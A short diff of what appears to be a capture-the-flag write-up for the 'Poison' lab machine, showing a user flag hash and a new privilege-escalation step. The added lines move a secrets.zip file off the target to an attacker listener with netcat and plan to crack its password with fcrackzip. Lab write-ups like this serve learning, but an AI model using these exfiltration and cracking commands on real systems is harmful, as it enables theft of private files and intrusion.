@@ -35,3 +35,7 @@ charix@Poison:~ % cat user.txt
 eaacdfb2d141b72a589233063604209c
 
 =================Priv Escalation============================
+In Charix home directory there is a secrets zip. I download this to analyz further on my machine
+Sender machine : nc 10.10.14.13 1234 < secrets.zip
+Receiver machine : nc -lvnp 1234 > secrets.zip
+The zip requires a password and so we have to try fcrackzip here.
